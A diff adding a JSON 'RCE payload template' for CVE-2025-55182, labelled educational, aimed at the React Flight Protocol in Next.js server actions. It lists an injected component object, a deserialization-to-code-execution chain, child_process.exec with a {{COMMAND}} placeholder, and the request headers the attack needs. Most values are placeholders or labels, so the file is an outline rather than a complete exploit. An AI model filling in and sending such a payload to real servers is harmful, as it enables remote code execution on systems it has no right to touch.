@@ -1,0 +1,36 @@
+{
+  "_comment": "CVE-2025-55182 — RCE Payload Şablonu (Eğitim Amaçlı)",
+  "_description": "React Flight Protocol üzerinden malicious object injection",
+  "payload_template": {
+    "flight_data": [
+      ["$", "@1", null, {
+        "id": "malicious_component",
+        "chunks": [],
+        "name": "",
+        "async": false
+      }]
+    ],
+    "exploit_vector": {
+      "type": "blob_handler",
+      "dispatch": "dynamic",
+      "chain": [
+        "deserialization",
+        "object_injection",
+        "dynamic_dispatch",
+        "blob_handler_exploit",
+        "code_execution"
+      ]
+    },
+    "rce_template": {
+      "method": "child_process.exec",
+      "command_placeholder": "{{COMMAND}}",
+      "encoding": "utf-8"
+    }
+  },
+  "content_type": "text/x-component",
+  "required_headers": {
+    "Content-Type": "text/x-component",
+    "Next-Action": "{{ACTION_ID}}",
+    "Next-Router-State-Tree": "{{STATE_TREE}}"
+  }
+}
